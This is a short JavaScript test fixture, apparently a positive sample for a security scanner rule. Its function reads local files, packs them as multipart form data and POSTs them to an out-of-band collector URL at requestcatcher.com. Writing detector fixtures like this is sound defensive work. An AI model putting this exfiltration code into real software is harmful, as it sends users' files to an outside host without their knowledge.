'use strict';
// Fixture: local files packed as multipart form data and POSTed to an
// out-of-band collector. Must convict the file-form POST OOB composite.
const fs = require('fs');
const FormData = require('form-data');

async function uploadBundle(httpRequest, paths) {
  const form = new FormData();
  for (const filePath of paths) {
    const fileBuffer = fs.readFileSync(filePath);
    form.append('files', fileBuffer, { filename: 'bundle.bin' });
  }
  const response = await httpRequest({
    method: 'POST',
    url: 'https://example.requestcatcher.com/drop',
    body: form,
    returnFullResponse: true,
    headers: form.getHeaders()
  });
  return response;
}

module.exports = { uploadBundle };
